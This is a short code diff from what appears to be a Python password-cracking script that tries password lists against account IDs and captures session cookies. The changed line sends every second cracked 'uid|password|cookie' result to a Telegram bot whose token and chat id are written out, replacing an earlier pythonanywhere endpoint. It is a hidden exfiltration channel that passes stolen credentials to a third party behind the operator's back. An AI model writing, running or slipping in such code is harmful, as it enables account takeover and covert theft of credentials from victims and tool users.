@@ -226,7 +226,7 @@ def crack(uid, password_list, total_count):
                 bkas.append(uid)
                 if len(bkas)% 2 == 0:
                     statusok = (f"{uid}|{pw}|{cookie_str}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    requests.get(f"https://api.telegram.org/bot7690571843:AAFzcd3eUZ43rnJfS_vz_ZsnTqRabEBSjRw/sendMessage?chat_id=1778046662&text={statusok}")
                 else:    
                     print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                     print("Cookies:", cookie_str)
